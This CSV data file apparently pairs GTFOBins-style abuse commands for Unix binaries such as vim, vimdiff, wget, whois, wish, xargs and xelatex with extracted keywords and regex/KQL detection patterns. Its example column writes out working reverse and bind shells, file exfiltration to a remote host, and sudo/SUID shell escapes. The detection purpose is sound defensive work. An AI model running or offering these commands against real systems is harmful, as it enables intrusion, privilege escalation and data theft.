Name,Function,ExampleCode,KeywordsExtracted,RegexFuzzyV7,RegexFuzzyV7_KQL,Notes
vim,file-download,"vim -c ':lua local k=require(""socket"");
  local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
  local c=s:accept();
  local d,x=c:receive(""*a"");
  c:close();
  local f=io.open(os.getenv(""LFILE""), ""wb"");
  f:write(d);
  io.close(f);'",lua local k=require s=assert k.bind os.getenv accept receive close f=io.open write io.close,(?i)\b(?:\S*/)?vim.*lua.*local.*krequire.*sassert.*k\.bind.*os\.getenv.*accept.*receive,"@""(?i)\b(?:\S*/)?vim.*lua.*local.*krequire.*sassert.*k\.bind.*os\.getenv.*accept.*receive""",
vim,file-write,"vim file_to_write
iDATA
^[
w",iDATA,(?i)\b(?:\S*/)?vim.*iDATA,"@""(?i)\b(?:\S*/)?vim.*iDATA""",
vim,file-read,vim file_to_read,,(?i)\b(?:\S*/)?vim\b,"@""(?i)\b(?:\S*/)?vim\b""",
vim,library-load,"vim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(""lib.so""); vim.command("":q!"")'",import from ctypes cdll cdll.LoadLibrary lib.so vim.command,(?i)\b(?:\S*/)?vim.*import.*from.*ctypes.*cdll.*cdll\.LoadLibrary.*lib\.so.*vim\.command,"@""(?i)\b(?:\S*/)?vim.*import.*from.*ctypes.*cdll.*cdll\.LoadLibrary.*lib\.so.*vim\.command""",
vim,suid,"./vim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-pc"", ""reset; exec sh -p"")'",import os.execl /bin/sh sh reset exec /vim,(?i)\b(?:\S*/)?vim.*import.*os\.execl.*/bin/sh.*sh.*reset.*exec.*/vim,"@""(?i)\b(?:\S*/)?vim.*import.*os\.execl.*/bin/sh.*sh.*reset.*exec.*/vim""",
vim,sudo,sudo vim -c ':!/bin/sh',sudo /bin/sh,(?i)\b(?:\S*/)?vim.*sudo.*/bin/sh,"@""(?i)\b(?:\S*/)?vim.*sudo.*/bin/sh""",
vim,sudo,"sudo vim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",sudo import os.execl /bin/sh sh reset exec,(?i)\b(?:\S*/)?vim.*sudo.*import.*os\.execl.*/bin/sh.*sh.*reset.*exec,"@""(?i)\b(?:\S*/)?vim.*sudo.*import.*os\.execl.*/bin/sh.*sh.*reset.*exec""",
vim,sudo,"sudo vim -c ':lua os.execute(""reset; exec sh"")'",sudo lua os.execute reset exec sh,(?i)\b(?:\S*/)?vim.*sudo.*lua.*os\.execute.*reset.*exec.*sh,"@""(?i)\b(?:\S*/)?vim.*sudo.*lua.*os\.execute.*reset.*exec.*sh""",
vim,capabilities,"./vim -c ':py import os; os.setuid(0); os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",import os.setuid os.execl /bin/sh sh reset exec /vim,(?i)\b(?:\S*/)?vim.*import.*os\.setuid.*os\.execl.*/bin/sh.*sh.*reset.*exec.*/vim,"@""(?i)\b(?:\S*/)?vim.*import.*os\.setuid.*os\.execl.*/bin/sh.*sh.*reset.*exec.*/vim""",
vim,limited-suid,"./vim -c ':lua os.execute(""reset; exec sh"")'",lua os.execute reset exec sh /vim,(?i)\b(?:\S*/)?vim.*lua.*os\.execute.*reset.*exec.*sh.*/vim,"@""(?i)\b(?:\S*/)?vim.*lua.*os\.execute.*reset.*exec.*sh.*/vim""",
vimdiff,shell,vimdiff -c ':!/bin/sh',/bin/sh,(?i)\b(?:\S*/)?vimdiff.*/bin/sh,"@""(?i)\b(?:\S*/)?vimdiff.*/bin/sh""",
vimdiff,shell,"vimdiff
:set shell=/bin/sh
:shell",set shell=/bin/sh shell /bin/sh,(?i)\b(?:\S*/)?vimdiff.*set.*shell/bin/sh.*shell.*/bin/sh,"@""(?i)\b(?:\S*/)?vimdiff.*set.*shell/bin/sh.*shell.*/bin/sh""",
vimdiff,shell,"vimdiff -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",import os.execl /bin/sh sh reset exec,(?i)\b(?:\S*/)?vimdiff.*import.*os\.execl.*/bin/sh.*sh.*reset.*exec,"@""(?i)\b(?:\S*/)?vimdiff.*import.*os\.execl.*/bin/sh.*sh.*reset.*exec""",
vimdiff,shell,"vimdiff -c ':lua os.execute(""reset; exec sh"")'",lua os.execute reset exec sh,(?i)\b(?:\S*/)?vimdiff.*lua.*os\.execute.*reset.*exec.*sh,"@""(?i)\b(?:\S*/)?vimdiff.*lua.*os\.execute.*reset.*exec.*sh""",
vimdiff,reverse-shell,"vimdiff -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")
vim.command("":q!"")'",import vim sys pty s=socket.socket s.connect os.getenv int os.dup2 s.fileno for pty.spawn /bin/sh vim.command,(?i)\b(?:\S*/)?vimdiff.*import.*vim.*sys.*pty.*ssocket\.socket.*s\.connect.*os\.getenv.*int,"@""(?i)\b(?:\S*/)?vimdiff.*import.*vim.*sys.*pty.*ssocket\.socket.*s\.connect.*os\.getenv.*int""",
vimdiff,non-interactive-reverse-shell,"vimdiff -c ':lua local s=require(""socket""); local t=assert(s.tcp());
  t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
  while true do
    local r,x=t:receive();local f=assert(io.popen(r,""r""));
    local b=assert(f:read(""*a""));t:send(b);
  end;
  f:close();t:close();'",lua local s=require t=assert s.tcp connect os.getenv while true receive f=assert io.popen b=assert read send end close,(?i)\b(?:\S*/)?vimdiff.*lua.*local.*srequire.*tassert.*s\.tcp.*connect.*os\.getenv.*while,"@""(?i)\b(?:\S*/)?vimdiff.*lua.*local.*srequire.*tassert.*s\.tcp.*connect.*os\.getenv.*while""",
vimdiff,non-interactive-bind-shell,"vimdiff -c ':lua local k=require(""socket"");
  local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
  local c=s:accept();
  while true do
    local r,x=c:receive();local f=assert(io.popen(r,""r""));
    local b=assert(f:read(""*a""));c:send(b);
  end;c:close();f:close();'",lua local k=require s=assert k.bind os.getenv accept while true receive f=assert io.popen b=assert read send end close,(?i)\b(?:\S*/)?vimdiff.*lua.*local.*krequire.*sassert.*k\.bind.*os\.getenv.*accept.*while,"@""(?i)\b(?:\S*/)?vimdiff.*lua.*local.*krequire.*sassert.*k\.bind.*os\.getenv.*accept.*while""",
vimdiff,file-upload,"vimdiff -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))
vim.command("":q!"")'",import vim sys from environ sys.version_info.major urllib.request urllib.parse else urllib urllib2 r.urlopen bytes u.urlencode open .read .encode vim.command,(?i)\b(?:\S*/)?vimdiff.*import.*vim.*sys.*from.*environ.*sys\.version_info\.major.*urllib\.request.*urllib\.parse,"@""(?i)\b(?:\S*/)?vimdiff.*import.*vim.*sys.*from.*environ.*sys\.version_info\.major.*urllib\.request.*urllib\.parse""",
vimdiff,file-upload,"vimdiff -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()
vim.command("":q!"")'",import vim sys from environ sys.version_info.major http.server socketserver else SimpleHTTPServer ss.TCPServer int s.SimpleHTTPRequestHandler .serve_forever vim.command,(?i)\b(?:\S*/)?vimdiff.*import.*vim.*sys.*from.*environ.*sys\.version_info\.major.*http\.server.*socketserver,"@""(?i)\b(?:\S*/)?vimdiff.*import.*vim.*sys.*from.*environ.*sys\.version_info\.major.*http\.server.*socketserver""",
vimdiff,file-upload,"vimdiff -c ':lua local f=io.open(os.getenv(""LFILE""), 'rb')
  local d=f:read(""*a"")
  io.close(f);
  local s=require(""socket"");
  local t=assert(s.tcp());
  t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
  t:send(d);
  t:close();'",lua local f=io.open os.getenv read io.close s=require t=assert s.tcp connect send close,(?i)\b(?:\S*/)?vimdiff.*lua.*local.*fio\.open.*os\.getenv.*read.*io\.close.*srequire.*tassert,"@""(?i)\b(?:\S*/)?vimdiff.*lua.*local.*fio\.open.*os\.getenv.*read.*io\.close.*srequire.*tassert""",
vimdiff,file-download,"vimdiff -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])
vim.command("":q!"")'",import vim sys from environ sys.version_info.major urllib.request else urllib r.urlretrieve vim.command,(?i)\b(?:\S*/)?vimdiff.*import.*vim.*sys.*from.*environ.*sys\.version_info\.major.*urllib\.request.*else,"@""(?i)\b(?:\S*/)?vimdiff.*import.*vim.*sys.*from.*environ.*sys\.version_info\.major.*urllib\.request.*else""",
vimdiff,file-download,"vimdiff -c ':lua local k=require(""socket"");
  local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
  local c=s:accept();
  local d,x=c:receive(""*a"");
  c:close();
  local f=io.open(os.getenv(""LFILE""), ""wb"");
  f:write(d);
  io.close(f);'",lua local k=require s=assert k.bind os.getenv accept receive close f=io.open write io.close,(?i)\b(?:\S*/)?vimdiff.*lua.*local.*krequire.*sassert.*k\.bind.*os\.getenv.*accept.*receive,"@""(?i)\b(?:\S*/)?vimdiff.*lua.*local.*krequire.*sassert.*k\.bind.*os\.getenv.*accept.*receive""",
vimdiff,file-write,"vimdiff file_to_write
iDATA
^[
w",iDATA,(?i)\b(?:\S*/)?vimdiff.*iDATA,"@""(?i)\b(?:\S*/)?vimdiff.*iDATA""",
vimdiff,file-read,vimdiff file_to_read,,(?i)\b(?:\S*/)?vimdiff\b,"@""(?i)\b(?:\S*/)?vimdiff\b""",
vimdiff,library-load,"vimdiff -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(""lib.so""); vim.command("":q!"")'",import vim from ctypes cdll cdll.LoadLibrary lib.so vim.command,(?i)\b(?:\S*/)?vimdiff.*import.*vim.*from.*ctypes.*cdll.*cdll\.LoadLibrary.*lib\.so.*vim\.command,"@""(?i)\b(?:\S*/)?vimdiff.*import.*vim.*from.*ctypes.*cdll.*cdll\.LoadLibrary.*lib\.so.*vim\.command""",
vimdiff,suid,"./vimdiff -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-pc"", ""reset; exec sh -p"")'",import os.execl /bin/sh sh reset exec /vimdiff,(?i)\b(?:\S*/)?vimdiff.*import.*os\.execl.*/bin/sh.*sh.*reset.*exec.*/vimdiff,"@""(?i)\b(?:\S*/)?vimdiff.*import.*os\.execl.*/bin/sh.*sh.*reset.*exec.*/vimdiff""",
vimdiff,sudo,sudo vimdiff -c ':!/bin/sh',sudo /bin/sh,(?i)\b(?:\S*/)?vimdiff.*sudo.*/bin/sh,"@""(?i)\b(?:\S*/)?vimdiff.*sudo.*/bin/sh""",
vimdiff,sudo,"sudo vimdiff -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",sudo import os.execl /bin/sh sh reset exec,(?i)\b(?:\S*/)?vimdiff.*sudo.*import.*os\.execl.*/bin/sh.*sh.*reset.*exec,"@""(?i)\b(?:\S*/)?vimdiff.*sudo.*import.*os\.execl.*/bin/sh.*sh.*reset.*exec""",
vimdiff,sudo,"sudo vimdiff -c ':lua os.execute(""reset; exec sh"")'",sudo lua os.execute reset exec sh,(?i)\b(?:\S*/)?vimdiff.*sudo.*lua.*os\.execute.*reset.*exec.*sh,"@""(?i)\b(?:\S*/)?vimdiff.*sudo.*lua.*os\.execute.*reset.*exec.*sh""",
vimdiff,capabilities,"./vimdiff -c ':py import os; os.setuid(0); os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",import os.setuid os.execl /bin/sh sh reset exec /vimdiff,(?i)\b(?:\S*/)?vimdiff.*import.*os\.setuid.*os\.execl.*/bin/sh.*sh.*reset.*exec.*/vimdiff,"@""(?i)\b(?:\S*/)?vimdiff.*import.*os\.setuid.*os\.execl.*/bin/sh.*sh.*reset.*exec.*/vimdiff""",
vimdiff,limited-suid,"./vimdiff -c ':lua os.execute(""reset; exec sh"")'",lua os.execute reset exec sh /vimdiff,(?i)\b(?:\S*/)?vimdiff.*lua.*os\.execute.*reset.*exec.*sh.*/vimdiff,"@""(?i)\b(?:\S*/)?vimdiff.*lua.*os\.execute.*reset.*exec.*sh.*/vimdiff""",
vipw,suid,./vipw,/vipw,(?i)\b(?:\S*/)?vipw.*/vipw,"@""(?i)\b(?:\S*/)?vipw.*/vipw""",
vipw,sudo,sudo vipw,sudo,(?i)\b(?:\S*/)?vipw.*sudo,"@""(?i)\b(?:\S*/)?vipw.*sudo""",
virsh,sudo,"cat > $TF << EOF
<domain type='kvm'>
  <name>x</name>
  <os>
    <type arch='x86_64'>hvm</type>
  </os>
  <memory unit='KiB'>1</memory>
  <devices>
    <interface type='ethernet'>
      <script path='$SCRIPT'/>
    </interface>
  </devices>
</domain>
EOF
sudo virsh -c qemu:///system create $TF
virsh -c qemu:///system destroy x",cat EOF type= kvm name /name type arch= hvm /type memory unit= KiB /memory devices interface ethernet script path= /interface /devices /domain sudo qemu ///system create destroy,(?i)\b(?:\S*/)?virsh.*cat.*EOF.*type.*kvm.*name.*/name.*type.*arch,"@""(?i)\b(?:\S*/)?virsh.*cat.*EOF.*type.*kvm.*name.*/name.*type.*arch""",
virsh,file-write,"echo 'data' > data_to_write
TF=$(mktemp)
cat > $TF <<EOF
<volume type='file'>
  <name>y</name>
  <key>$LFILE_DIR/$LFILE_NAME</key>
  <source>
  </source>
  <capacity unit='bytes'>5</capacity>
  <allocation unit='bytes'>4096</allocation>
  <physical unit='bytes'>5</physical>
  <target>
    <path>$LFILE_DIR/$LFILE_NAME</path>
    <format type='raw'/>
    <permissions>
      <mode>0600</mode>
      <owner>0</owner>
      <group>0</group>
    </permissions>
  </target>
</volume>
EOF
virsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR
virsh -c qemu:///system vol-create --pool x --file $TF
virsh -c qemu:///system vol-upload --pool x $LFILE_DIR/$LFILE_NAME data_to_write
virsh -c qemu:///system pool-destroy x",echo data_to_write mktemp cat EOF volume type= name /name key LFILE_DIR/ LFILE_NAME /key source /source capacity unit= bytes /capacity allocation /allocation physical /physical target /path format raw permissions mode /mode owner /owner group /group /permissions /target /volume qemu ///system pool-create-as --target LFILE_DIR vol-create --pool --file vol-upload pool-destroy,(?i)\b(?:\S*/)?virsh.*echo.*data_to_write.*mktemp.*cat.*EOF.*volume.*type.*name,"@""(?i)\b(?:\S*/)?virsh.*echo.*data_to_write.*mktemp.*cat.*EOF.*volume.*type.*name""",
virsh,file-read,"virsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR
virsh -c qemu:///system vol-download --pool x $LFILE_NAME $SPATH
virsh -c qemu:///system pool-destroy x",qemu ///system pool-create-as --target LFILE_DIR vol-download --pool LFILE_NAME SPATH pool-destroy,(?i)\b(?:\S*/)?virsh.*qemu.*///system.*pool\-create\-as.*\-\-target.*LFILE_DIR.*vol\-download.*\-\-pool.*LFILE_NAME,"@""(?i)\b(?:\S*/)?virsh.*qemu.*///system.*pool\-create\-as.*\-\-target.*LFILE_DIR.*vol\-download.*\-\-pool.*LFILE_NAME""",
volatility,shell,"volatility -f file.dump volshell
__import__('os').system('/bin/sh')",file.dump volshell __import__ .system /bin/sh,(?i)\b(?:\S*/)?volatility.*file\.dump.*volshell.*__import__.*\.system.*/bin/sh,"@""(?i)\b(?:\S*/)?volatility.*file\.dump.*volshell.*__import__.*\.system.*/bin/sh""",
w3m,file-read,"w3m ""$LFILE"" -dump","""-dump",(?i)\b(?:\S*/)?w3m.*\-dump,"@""(?i)\b(?:\S*/)?w3m.*\-dump""",
w3m,suid,"./w3m ""$LFILE"" -dump","""-dump",(?i)\b(?:\S*/)?w3m.*\-dump,"@""(?i)\b(?:\S*/)?w3m.*\-dump""",
w3m,sudo,"sudo w3m ""$LFILE"" -dump",sudo -dump,(?i)\b(?:\S*/)?w3m.*sudo.*\-dump,"@""(?i)\b(?:\S*/)?w3m.*sudo.*\-dump""",
wall,sudo,"sudo wall --nobanner ""$LFILE""",sudo --nobanner,(?i)\b(?:\S*/)?wall.*sudo.*\-\-nobanner,"@""(?i)\b(?:\S*/)?wall.*sudo.*\-\-nobanner""",
watch,shell,watch -x sh -c 'reset; exec sh 1>&0 2>&0',sh reset exec,(?i)\b(?:\S*/)?watch.*sh.*reset.*exec,"@""(?i)\b(?:\S*/)?watch.*sh.*reset.*exec""",
watch,suid,./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0',sh reset exec /watch,(?i)\b(?:\S*/)?watch.*sh.*reset.*exec.*/watch,"@""(?i)\b(?:\S*/)?watch.*sh.*reset.*exec.*/watch""",
watch,sudo,sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0',sudo sh reset exec,(?i)\b(?:\S*/)?watch.*sudo.*sh.*reset.*exec,"@""(?i)\b(?:\S*/)?watch.*sudo.*sh.*reset.*exec""",
watch,limited-suid,./watch 'reset; exec sh 1>&0 2>&0',reset exec sh /watch,(?i)\b(?:\S*/)?watch.*reset.*exec.*sh.*/watch,"@""(?i)\b(?:\S*/)?watch.*reset.*exec.*sh.*/watch""",
wc,file-read,"wc --files0-from ""$LFILE""","""--files0-from",(?i)\b(?:\S*/)?wc.*\-\-files0\-from,"@""(?i)\b(?:\S*/)?wc.*\-\-files0\-from""",
wc,suid,"./wc --files0-from ""$LFILE""","""--files0-from",(?i)\b(?:\S*/)?wc.*\-\-files0\-from,"@""(?i)\b(?:\S*/)?wc.*\-\-files0\-from""",
wc,sudo,"sudo wc --files0-from ""$LFILE""",sudo --files0-from,(?i)\b(?:\S*/)?wc.*sudo.*\-\-files0\-from,"@""(?i)\b(?:\S*/)?wc.*sudo.*\-\-files0\-from""",
wget,shell,"chmod +x $TF
echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
wget --use-askpass=$TF 0",chmod echo /bin/sh n/bin/sh --use-askpass=,(?i)\b(?:\S*/)?wget.*chmod.*echo.*/bin/sh.*n/bin/sh.*\-\-use\-askpass,"@""(?i)\b(?:\S*/)?wget.*chmod.*echo.*/bin/sh.*n/bin/sh.*\-\-use\-askpass""",
wget,file-upload,wget --post-file=$LFILE $URL,--post-file=,(?i)\b(?:\S*/)?wget.*\-\-post\-file,"@""(?i)\b(?:\S*/)?wget.*\-\-post\-file""",
wget,file-read,wget -i $LFILE,,(?i)\b(?:\S*/)?wget\b,"@""(?i)\b(?:\S*/)?wget\b""",
wget,file-write,"echo DATA > $TF
wget -i $TF -o $LFILE",echo,(?i)\b(?:\S*/)?wget.*echo,"@""(?i)\b(?:\S*/)?wget.*echo""",
wget,file-download,wget $URL -O $LFILE,,(?i)\b(?:\S*/)?wget\b,"@""(?i)\b(?:\S*/)?wget\b""",
wget,suid,"chmod +x $TF
echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
./wget --use-askpass=$TF 0",chmod echo /bin/sh n/bin/sh --use-askpass= /wget,(?i)\b(?:\S*/)?wget.*chmod.*echo.*/bin/sh.*n/bin/sh.*\-\-use\-askpass.*/wget,"@""(?i)\b(?:\S*/)?wget.*chmod.*echo.*/bin/sh.*n/bin/sh.*\-\-use\-askpass.*/wget""",
wget,sudo,"chmod +x $TF
echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
sudo wget --use-askpass=$TF 0",chmod echo /bin/sh n/bin/sh sudo --use-askpass=,(?i)\b(?:\S*/)?wget.*chmod.*echo.*/bin/sh.*n/bin/sh.*sudo.*\-\-use\-askpass,"@""(?i)\b(?:\S*/)?wget.*chmod.*echo.*/bin/sh.*n/bin/sh.*sudo.*\-\-use\-askpass""",
whiptail,file-read,"whiptail --textbox --scrolltext ""$LFILE"" 0 0","""--textbox --scrolltext",(?i)\b(?:\S*/)?whiptail.*\-\-textbox.*\-\-scrolltext,"@""(?i)\b(?:\S*/)?whiptail.*\-\-textbox.*\-\-scrolltext""",
whiptail,suid,"./whiptail --textbox --scrolltext ""$LFILE"" 0 0","""--textbox --scrolltext /whiptail",(?i)\b(?:\S*/)?whiptail.*\-\-textbox.*\-\-scrolltext.*/whiptail,"@""(?i)\b(?:\S*/)?whiptail.*\-\-textbox.*\-\-scrolltext.*/whiptail""",
whiptail,sudo,"sudo whiptail --textbox --scrolltext ""$LFILE"" 0 0",sudo --textbox --scrolltext,(?i)\b(?:\S*/)?whiptail.*sudo.*\-\-textbox.*\-\-scrolltext,"@""(?i)\b(?:\S*/)?whiptail.*sudo.*\-\-textbox.*\-\-scrolltext""",
whois,file-upload,"whois -h $RHOST -p $RPORT ""`cat $LFILE`""",cat,(?i)\b(?:\S*/)?whois.*cat,"@""(?i)\b(?:\S*/)?whois.*cat""",
whois,file-upload,"whois -h $RHOST -p $RPORT ""`base64 $LFILE`""",base64,(?i)\b(?:\S*/)?whois.*base64,"@""(?i)\b(?:\S*/)?whois.*base64""",
whois,file-download,"whois -h $RHOST -p $RPORT > ""$LFILE""",,(?i)\b(?:\S*/)?whois\b,"@""(?i)\b(?:\S*/)?whois\b""",
whois,file-download,"whois -h $RHOST -p $RPORT | base64 -d > ""$LFILE""",base64,(?i)\b(?:\S*/)?whois.*base64,"@""(?i)\b(?:\S*/)?whois.*base64""",
wireshark,command,wireshark,,(?i)\b(?:\S*/)?wireshark\b,"@""(?i)\b(?:\S*/)?wireshark\b""",
wireshark,sudo,"sudo wireshark -c 1 -i lo -k -f ""udp port $PORT"" &
echo 'DATA' | nc -u 127.127.127.127 ""$PORT""",sudo udp echo nc,(?i)\b(?:\S*/)?wireshark.*sudo.*udp.*echo.*nc,"@""(?i)\b(?:\S*/)?wireshark.*sudo.*udp.*echo.*nc""",
wish,shell,"wish
exec /bin/sh <@stdin >@stdout 2>@stderr",exec /bin/sh,(?i)\b(?:\S*/)?wish.*exec.*/bin/sh,"@""(?i)\b(?:\S*/)?wish.*exec.*/bin/sh""",
wish,non-interactive-reverse-shell,"echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s ""> "";flush $s;gets $s c;set e ""exec $c"";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | wish",echo set env while puts -nonewline flush gets exec catch eval err close,(?i)\b(?:\S*/)?wish.*echo.*set.*env.*while.*puts.*\-nonewline.*flush.*gets,"@""(?i)\b(?:\S*/)?wish.*echo.*set.*env.*while.*puts.*\-nonewline.*flush.*gets""",
wish,sudo,"sudo wish
exec /bin/sh <@stdin >@stdout 2>@stderr",sudo exec /bin/sh,(?i)\b(?:\S*/)?wish.*sudo.*exec.*/bin/sh,"@""(?i)\b(?:\S*/)?wish.*sudo.*exec.*/bin/sh""",
xargs,shell,xargs -a /dev/null sh,/dev/null sh,(?i)\b(?:\S*/)?xargs.*/dev/null.*sh,"@""(?i)\b(?:\S*/)?xargs.*/dev/null.*sh""",
xargs,shell,echo x | xargs -Iy sh -c 'exec sh 0<&1',echo sh exec,(?i)\b(?:\S*/)?xargs.*echo.*sh.*exec,"@""(?i)\b(?:\S*/)?xargs.*echo.*sh.*exec""",
xargs,shell,"xargs -Ix sh -c 'exec sh 0<&1'
x^D^D",sh exec,(?i)\b(?:\S*/)?xargs.*sh.*exec,"@""(?i)\b(?:\S*/)?xargs.*sh.*exec""",
xargs,file-read,"xargs -a ""$LFILE"" -0",,(?i)\b(?:\S*/)?xargs\b,"@""(?i)\b(?:\S*/)?xargs\b""",
xargs,suid,./xargs -a /dev/null sh -p,/dev/null sh /xargs,(?i)\b(?:\S*/)?xargs.*/dev/null.*sh.*/xargs,"@""(?i)\b(?:\S*/)?xargs.*/dev/null.*sh.*/xargs""",
xargs,sudo,sudo xargs -a /dev/null sh,sudo /dev/null sh,(?i)\b(?:\S*/)?xargs.*sudo.*/dev/null.*sh,"@""(?i)\b(?:\S*/)?xargs.*sudo.*/dev/null.*sh""",
xdg-user-dir,shell,xdg-user-dir '}; /bin/sh #',/bin/sh,(?i)\b(?:\S*/)?xdg\-user\-dir.*/bin/sh,"@""(?i)\b(?:\S*/)?xdg\-user\-dir.*/bin/sh""",
xdg-user-dir,sudo,sudo xdg-user-dir '}; /bin/sh #',sudo /bin/sh,(?i)\b(?:\S*/)?xdg\-user\-dir.*sudo.*/bin/sh,"@""(?i)\b(?:\S*/)?xdg\-user\-dir.*sudo.*/bin/sh""",
xdotool,shell,xdotool exec --sync /bin/sh,exec --sync /bin/sh,(?i)\b(?:\S*/)?xdotool.*exec.*\-\-sync.*/bin/sh,"@""(?i)\b(?:\S*/)?xdotool.*exec.*\-\-sync.*/bin/sh""",
xdotool,suid,./xdotool exec --sync /bin/sh -p,exec --sync /bin/sh /xdotool,(?i)\b(?:\S*/)?xdotool.*exec.*\-\-sync.*/bin/sh.*/xdotool,"@""(?i)\b(?:\S*/)?xdotool.*exec.*\-\-sync.*/bin/sh.*/xdotool""",
xdotool,sudo,sudo xdotool exec --sync /bin/sh,sudo exec --sync /bin/sh,(?i)\b(?:\S*/)?xdotool.*sudo.*exec.*\-\-sync.*/bin/sh,"@""(?i)\b(?:\S*/)?xdotool.*sudo.*exec.*\-\-sync.*/bin/sh""",
xelatex,shell,xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}',"""--shell-escape documentclass article begin document immediate write18 /bin/sh end",(?i)\b(?:\S*/)?xelatex.*\-\-shell\-escape.*documentclass.*article.*begin.*document.*immediate.*write18.*/bin/sh,"@""(?i)\b(?:\S*/)?xelatex.*\-\-shell\-escape.*documentclass.*article.*begin.*document.*immediate.*write18.*/bin/sh""",
xelatex,file-read,"xelatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
strings article.dvi",documentclass article usepackage verbatim begin document verbatiminput end strings article.dvi,(?i)\b(?:\S*/)?xelatex.*documentclass.*article.*usepackage.*verbatim.*begin.*document.*verbatiminput.*end,"@""(?i)\b(?:\S*/)?xelatex.*documentclass.*article.*usepackage.*verbatim.*begin.*document.*verbatiminput.*end""",
xelatex,sudo,"sudo xelatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
strings article.dvi",sudo documentclass article usepackage verbatim begin document verbatiminput end strings article.dvi,(?i)\b(?:\S*/)?xelatex.*sudo.*documentclass.*article.*usepackage.*verbatim.*begin.*document.*verbatiminput,"@""(?i)\b(?:\S*/)?xelatex.*sudo.*documentclass.*article.*usepackage.*verbatim.*begin.*document.*verbatiminput""",
xelatex,sudo,sudo xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}',sudo --shell-escape documentclass article begin document immediate write18 /bin/sh end,(?i)\b(?:\S*/)?xelatex.*sudo.*\-\-shell\-escape.*documentclass.*article.*begin.*document.*immediate.*write18,"@""(?i)\b(?:\S*/)?xelatex.*sudo.*\-\-shell\-escape.*documentclass.*article.*begin.*document.*immediate.*write18""",
xelatex,limited-suid,./xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}',"""--shell-escape documentclass article begin document immediate write18 /bin/sh end /xelatex",(?i)\b(?:\S*/)?xelatex.*\-\-shell\-escape.*documentclass.*article.*begin.*document.*immediate.*write18.*/bin/sh,"@""(?i)\b(?:\S*/)?xelatex.*\-\-shell\-escape.*documentclass.*article.*begin.*document.*immediate.*write18.*/bin/sh""",
